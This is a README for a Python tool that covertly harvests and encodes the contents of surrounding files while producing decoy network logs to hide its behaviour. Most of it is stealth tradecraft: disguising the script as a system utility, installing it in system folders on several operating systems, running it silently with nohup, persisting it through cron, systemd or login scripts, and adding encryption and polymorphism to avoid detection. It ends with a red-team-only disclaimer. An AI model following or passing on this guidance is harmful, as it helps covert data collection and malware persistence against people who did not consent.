# sysdiag_util (Sightings Branch - Stealth Deployment)

This utility is a dual-purpose Python tool designed for stealth operations. It performs a hidden payload operation under the guise of generating legitimate-looking network anomaly logs.

---

## 🎯 Purpose

- **Primary Function (`m1Actual`)**: Encodes file contents from surrounding directories into a human-readable, dictionary-based format.
- **Decoy Function (`m1Alternate`)**: Simulates detailed network packet anomaly logs to obfuscate true behavior.

---

## 🛠️ Setup Instructions

### 1. Rename the Script

To blend in with typical system utilities:
```bash
mv sightings.py sysdiag_util.py
```

### 2. Add Shebang (optional if not already included)
```bash
#!/usr/bin/env python3
```

Then make it executable:
```bash
chmod +x sysdiag_util.py
```

### 3. Make a Standalone `.pyz` Executable (optional)
```bash
python3 -m zipapp sysdiag_util.py -o sysdiag_util.pyz -m "sysdiag_util:main"
```

Run:
```bash
python3 sysdiag_util.pyz
```

---

## 🚀 Usage

### Run both modes:
```bash
python3 sysdiag_util.py
```

### Run only the payload (m1Actual):
```bash
python3 sysdiag_util.py --m1Actual-only
```

### Run only the decoy output (m1Alternate):
```bash
python3 sysdiag_util.py --m1Alternate-only
```

---

## 📁 Output Files

- `policyReenforcement.txt` — Contains encoded payload (obfuscated, reversible).
- `sightings_log.txt` — Legitimate-looking but meaningless anomaly logs.

---

## 🕵️ Stealth Tips

- Rename script to `netdiag.py`, `update_monitor.py`, etc.
- Install under:
  - `/usr/local/bin/`
  - `~/Library/Application Support/`
  - `C:\ProgramData\SystemLogs\`

- Use `nohup` to run silently:
```bash
nohup python3 sysdiag_util.py --m1Actual-only > /dev/null 2>&1 &
```

- Schedule via cron, systemd, Task Scheduler, or login scripts.

---

## 🔒 Optional Enhancements

- Add XOR or AES encryption for payload.
- Add compression (zlib) before encoding.
- Auto-purge or rotate decoy logs after X days.
- Randomize log verbosity or wordlist entries for polymorphic behavior.

---

This utility is designed for research, simulation, or red team activities only.
Do **not** use in production or against any systems you do not own or have explicit permission to test.

